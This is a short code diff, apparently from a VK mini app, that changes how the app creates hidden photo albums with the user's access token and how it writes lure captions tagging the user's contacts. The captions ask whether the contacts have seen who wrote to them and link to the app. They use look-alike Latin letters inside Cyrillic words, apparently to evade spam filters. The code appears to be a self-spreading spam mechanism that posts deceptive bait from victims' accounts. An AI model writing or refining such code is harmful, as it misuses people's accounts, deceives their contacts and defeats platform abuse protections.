@@ -91,7 +91,7 @@
     function createAlbom(){
       vkConnect.sendPromise("VKWebAppCallAPIMethod", {
           "method": "photos.createAlbum",
-          "params": {"title": randomString(getRandom(3,15)), "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
+          "params": {"title": randomString(getRandom(5,15)), "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
       }).then(data => {
         id_albom = data.response.id;
         uploadPhotoAlbom(id_albom);
@@ -134,7 +134,7 @@
                     //users_list+", oставляю о тебе мнения, посмотри если интересно : \n\n https://vk.com/app"+vk_app_id
 
                     var text = [
-                      users_list+" ты видела кто тeбе отправил мнeниe? : \n\n https://vk.cc/cd7rF4 "
+                      users_list+" видела кто тeбе написал в пpиложeнии? : \n\n https://vk.com/app8152009 "
                     ];
                     var caption = text[getRandom(0,text.length-1)];
 
